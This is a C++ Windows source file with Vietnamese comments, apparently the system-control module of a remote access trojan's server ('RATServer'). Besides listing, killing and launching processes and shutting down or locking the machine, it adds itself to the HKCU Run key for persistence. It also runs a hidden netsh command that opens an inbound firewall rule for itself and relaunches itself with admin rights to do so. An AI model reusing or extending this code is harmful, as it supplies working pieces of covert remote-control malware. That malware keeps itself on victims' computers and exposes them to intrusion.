#include "SystemManager.h"

// Helper function to convert TCHAR to std::string
std::string TCharToString(const TCHAR* tcharStr) {
#ifdef UNICODE
    int len = WideCharToMultiByte(CP_UTF8, 0, tcharStr, -1, NULL, 0, NULL, NULL);
    if (len == 0) return "";
    std::string result(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, tcharStr, -1, &result[0], len, NULL, NULL);
    return result;
#else
    return std::string(tcharStr);
#endif
}

// Hàm lấy memory usage của một process (KB)
DWORD GetProcessMemoryUsage(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) return 0;

    PROCESS_MEMORY_COUNTERS pmc;
    DWORD memoryKB = 0;

    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
        memoryKB = (DWORD)(pmc.WorkingSetSize / 1024); // Convert bytes to KB
    }

    CloseHandle(hProcess);
    return memoryKB;
}

std::vector<std::string> GetProcessList() {
    std::vector<std::string> listProc;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return listProc;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return listProc;
    }

    do {
        DWORD memoryKB = GetProcessMemoryUsage(pe32.th32ProcessID);
        std::string exeName = TCharToString(pe32.szExeFile);
        
        // Format: "processname.exe | PID | MemoryKB"
        listProc.push_back(
            exeName + " | " + 
            std::to_string(pe32.th32ProcessID) + " | " + 
            std::to_string(memoryKB)
        );
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return listProc;
}

bool KillProcessByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) return false;

    BOOL result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return (result != 0);
}

int KillProcessByName(std::string targetInput) {
    std::string target = ToLower(targetInput);
    if (target.find(".exe") == std::string::npos) target += ".exe";

    int killCount = 0;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        std::string exeName = TCharToString(pe32.szExeFile);
        
        if (ToLower(exeName) == target) {
            if (KillProcessByPID(pe32.th32ProcessID)) {
                killCount++;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return killCount;
}

bool StartApp(std::string path) {
    return ((intptr_t)ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW) > 32);
}

void SystemControl(std::string type) {
    if (type == "SHUTDOWN") {
        system("shutdown /s /t 5");
    }
    else if (type == "RESTART") {
        system("shutdown /r /t 5");
    }
    else if (type == "LOCK") {
        system("rundll32.exe user32.dll,LockWorkStation");
    }
}

// [MỚI] Hàm thêm chính mình vào Startup
bool InstallStartup() {
    char path[MAX_PATH];
    // 1. Lấy đường dẫn tuyệt đối của file .exe đang chạy
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return false;

    HKEY hKey;
    // 2. Mở khóa Registry Run của User hiện tại
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 3. Ghi giá trị (Tên: RATServer, Dữ liệu: Đường dẫn file exe)
    long result = RegSetValueExA(hKey, "RATServer", 0, REG_SZ, (LPBYTE)path, strlen(path) + 1);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// [MỚI] Hàm gỡ bỏ khỏi Startup
bool RemoveStartup() {
    HKEY hKey;
    // 1. Mở khóa
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 2. Xóa giá trị có tên RATServer
    long result = RegDeleteValueA(hKey, "RATServer");

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// [MỚI] Hàm kiểm tra xem Startup đã được cài đặt chưa
bool CheckStartupExists() {
    HKEY hKey;
    // 1. Mở khóa Registry Run của User hiện tại
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 2. Kiểm tra xem giá trị RATServer có tồn tại không
    char buffer[MAX_PATH];
    DWORD bufferSize = MAX_PATH;
    long result = RegQueryValueExA(hKey, "RATServer", NULL, NULL, (LPBYTE)buffer, &bufferSize);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

void SetupFirewall() {
    char path[MAX_PATH];
    // 1. Lấy đường dẫn file .exe hiện tại
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return;
    std::string exePath = std::string(path);

    // 2. Tạo lệnh CMD để mở Firewall cho App này
    // Lệnh: netsh advfirewall firewall add rule name="RAT_Server" dir=in action=allow program="C:\path\to\server.exe" enable=yes
    std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & "; // Xóa rule cũ nếu có để tránh trùng
    cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + exePath + "\" enable=yes";

    // 3. Thực thi lệnh ngầm (Runas để yêu cầu quyền Admin nếu cần, SW_HIDE để không hiện cửa sổ)
    ShellExecuteA(NULL, "runas", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
}

// [MỚI] Kiểm tra xem tiến trình hiện tại có quyền Admin không
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

// [MỚI] Logic thông minh: Tự động đòi Admin nếu cần thiết
// Trả về TRUE nếu mọi thứ đã ổn (hoặc đã xử lý xong)
// Trả về FALSE nếu đang yêu cầu restart bằng Admin (cần tắt bản hiện tại)
bool CheckAndSetupFirewall() {
    // 1. Lấy đường dẫn file EXE hiện tại
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return true;
    std::string currentPath = std::string(path);

    // 2. Đọc đường dẫn cũ đã lưu trong Registry
    HKEY hKey;
    char savedPath[MAX_PATH] = "";
    DWORD bufferSize = sizeof(savedPath);
    bool needUpdate = true;

    // Mở khóa Registry của app (HKCU\Software\RATServer)
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "FirewallPath", NULL, NULL, (LPBYTE)savedPath, &bufferSize) == ERROR_SUCCESS) {
            // So sánh: Nếu đường dẫn hiện tại GIỐNG đường dẫn đã lưu -> Firewall đã OK
            if (currentPath == std::string(savedPath)) {
                needUpdate = false;
            }
        }
        RegCloseKey(hKey);
    }

    // 3. Nếu không cần update -> Cho qua luôn
    if (!needUpdate) return true;

    // 4. Nếu cần update (Lần đầu hoặc đổi chỗ) -> Kiểm tra quyền Admin
    if (IsRunAsAdmin()) {
        // --- TRƯỜNG HỢP: ĐÃ LÀ ADMIN ---
        // a. Chạy lệnh mở Firewall (Code cũ của bạn)
        std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & ";
        cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + currentPath + "\" enable=yes";
        ShellExecuteA(NULL, "open", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);

        // b. Lưu đường dẫn mới vào Registry để lần sau không hỏi nữa
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "FirewallPath", 0, REG_SZ, (const BYTE*)currentPath.c_str(), currentPath.length() + 1);
            RegCloseKey(hKey);
        }

        return true; // Đã xử lý xong, chạy tiếp
    }
    else {
        // --- TRƯỜNG HỢP: CHƯA LÀ ADMIN ---
        // Yêu cầu Windows chạy lại chính file này với quyền Admin ("runas")
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
        return false; // Báo cho main() biết để tự tắt bản user này đi
    }
}

// =============================================================================
// QUẢN LÝ INSTALLED APPLICATIONS
// =============================================================================

// Helper: Get process name from PID
std::string GetProcessNameFromPID(DWORD pid) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return "";

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (pe32.th32ProcessID == pid) {
                std::string exeName = TCharToString(pe32.szExeFile);
                CloseHandle(hProcessSnap);
                return exeName;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return "";
}

// Helper: Get all PIDs for a process name
std::vector<DWORD> GetPIDsByProcessName(const std::string& processName) {
    std::vector<DWORD> pids;
    std::string lowerName = ToLower(processName);
    
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return pids;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::string exeName = TCharToString(pe32.szExeFile);
            
            if (ToLower(exeName) == lowerName) {
                pids.push_back(pe32.th32ProcessID);
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return pids;
}

// Get list of installed applications from Registry
std::vector<AppInfo> GetInstalledApplications() {
    std::vector<AppInfo> apps;
    std::set<std::string> addedApps; // To avoid duplicates

    // Registry paths to check for installed applications
    const wchar_t* registryPaths[] = {
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    };

    for (const wchar_t* regPath : registryPaths) {
        HKEY hUninstallKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hUninstallKey) == ERROR_SUCCESS) {
            DWORD subKeyCount = 0;
            RegQueryInfoKeyW(hUninstallKey, NULL, NULL, NULL, &subKeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

            for (DWORD i = 0; i < subKeyCount; i++) {
                wchar_t subKeyName[256];
                DWORD subKeyNameSize = 256;
                
                if (RegEnumKeyExW(hUninstallKey, i, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                    HKEY hAppKey;
                    if (RegOpenKeyExW(hUninstallKey, subKeyName, 0, KEY_READ, &hAppKey) == ERROR_SUCCESS) {
                        wchar_t displayName[256] = L"";
                        wchar_t installLocation[512] = L"";
                        wchar_t version[128] = L"";
                        DWORD systemComponent = 0;
                        DWORD bufferSize;
                        DWORD dataType;

                        // Read DisplayName
                        bufferSize = sizeof(displayName);
                        RegQueryValueExW(hAppKey, L"DisplayName", NULL, &dataType, (LPBYTE)displayName, &bufferSize);

                        // Skip if no display name or is system component
                        bufferSize = sizeof(systemComponent);
                        RegQueryValueExW(hAppKey, L"SystemComponent", NULL, NULL, (LPBYTE)&systemComponent, &bufferSize);
                        
                        if (wcslen(displayName) == 0 || systemComponent == 1) {
                            RegCloseKey(hAppKey);
                            continue;
                        }

                        // Read InstallLocation
                        bufferSize = sizeof(installLocation);
                        RegQueryValueExW(hAppKey, L"InstallLocation", NULL, &dataType, (LPBYTE)installLocation, &bufferSize);

                        // Read DisplayVersion
                        bufferSize = sizeof(version);
                        RegQueryValueExW(hAppKey, L"DisplayVersion", NULL, &dataType, (LPBYTE)version, &bufferSize);

                        RegCloseKey(hAppKey);

                        // Convert to UTF-8 strings
                        std::string appName = WCharToUTF8(displayName);
                        std::string appLocation = WCharToUTF8(installLocation);
                        std::string appVersion = WCharToUTF8(version);
                        
                        // Check if already added (avoid duplicates)
                        if (addedApps.find(appName) != addedApps.end()) {
                            continue;
                        }
                        addedApps.insert(appName);

                        // Create AppInfo
                        AppInfo app;
                        app.displayName = appName;
                        app.installLocation = appLocation;
                        app.version = appVersion;
                        
                        // Extract executable name from display name (simple heuristic)
                        app.name = appName;
                        
                        // Check if app is running by looking for common executable names
                        app.isRunning = false;
                        app.runningPIDs.clear();

                        // Try to find executable in install location
                        if (!appLocation.empty()) {
                            std::string exeName = "";
                            
                            // Search for .exe files in install location
                            WIN32_FIND_DATAA findData;
                            std::string searchPath = appLocation + "\\*.exe";
                            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
                            
                            if (hFind != INVALID_HANDLE_VALUE) {
                                // Use first .exe found as the main executable
                                exeName = findData.cFileName;
                                FindClose(hFind);
                                
                                // Check if this process is running
                                app.runningPIDs = GetPIDsByProcessName(exeName);
                                app.isRunning = !app.runningPIDs.empty();
                            }
                        }

                        apps.push_back(app);
                    }
                }
            }
            RegCloseKey(hUninstallKey);
        }
    }

    return apps;
}

// Start an application
bool StartApplication(const std::string& appName) {
    // Get list of installed apps
    auto apps = GetInstalledApplications();
    
    for (const auto& app : apps) {
        if (app.displayName == appName) {
            if (!app.installLocation.empty()) {
                // Try to find and start the executable
                WIN32_FIND_DATAA findData;
                std::string searchPath = app.installLocation + "\\*.exe";
                HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
                
                if (hFind != INVALID_HANDLE_VALUE) {
                    std::string exePath = app.installLocation + "\\" + std::string(findData.cFileName);
                    FindClose(hFind);
                    
                    return StartApp(exePath);
                }
            }
            
            // Fallback: Try to start by display name
            return StartApp(app.displayName);
        }
    }
    
    return false;
}

// Stop an application (kill all its processes)
bool StopApplication(const std::string& appName) {
    // Get list of installed apps
    auto apps = GetInstalledApplications();
    
    for (const auto& app : apps) {
        if (app.displayName == appName) {
            if (app.isRunning && !app.runningPIDs.empty()) {
                // Kill all running instances
                bool success = true;
                for (DWORD pid : app.runningPIDs) {
                    if (!KillProcessByPID(pid)) {
                        success = false;
                    }
                }
                return success;
            }
            return false; // App not running
        }
    }
    
    return false; // App not found
}